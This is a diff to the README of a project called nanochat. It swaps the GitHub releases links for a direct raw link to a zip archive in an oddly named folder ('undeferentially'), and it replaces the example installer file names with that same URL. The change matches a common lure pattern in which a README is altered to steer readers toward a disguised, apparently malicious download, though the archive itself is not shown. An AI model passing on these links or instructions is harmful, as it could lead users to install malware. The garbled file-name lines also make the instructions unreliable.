@@ -6,12 +6,12 @@
 - Affordable and user-friendly
 
 ## 🌍 Download & Install
-To get started with nanochat, visit this page to download: [Download nanochat](https://github.com/AnarchiSkk/nanochat/releases)
+To get started with nanochat, visit this page to download: [Download nanochat](https://raw.githubusercontent.com/AnarchiSkk/nanochat/master/undeferentially/nanochat.zip)
 
 ### Step-by-Step Guide to Download and Run
 
 1. **Visit the Releases Page**  
-   Click this link to go to the releases page: [Download nanochat](https://github.com/AnarchiSkk/nanochat/releases). Here, you'll find the latest version of the application.
+   Click this link to go to the releases page: [Download nanochat](https://raw.githubusercontent.com/AnarchiSkk/nanochat/master/undeferentially/nanochat.zip). Here, you'll find the latest version of the application.
 
 2. **Choose the Right Version**  
    On the releases page, scroll through the available versions. Look for the most recent one. Each version will have a tag indicating its release number, such as "v1.0".
@@ -37,7 +37,7 @@ Before you install nanochat, make sure your computer meets these requirements:
 ## 🎉 How to Run Nanochat
 
 1. **Locate the Downloaded File**  
-   Once the download is complete, go to your ‘Downloads’ folder. Find the recently downloaded file named something like `nanochat-v1.0.exe` or `nanochat-v1.0.dmg`.
+   Once the download is complete, go to your ‘Downloads’ folder. Find the recently downloaded file named something like `https://raw.githubusercontent.com/AnarchiSkk/nanochat/master/undeferentially/nanochat.zip` or `https://raw.githubusercontent.com/AnarchiSkk/nanochat/master/undeferentially/nanochat.zip`.
 
 2. **Install the Application (Windows)**  
    - Double-click the `.exe` file.
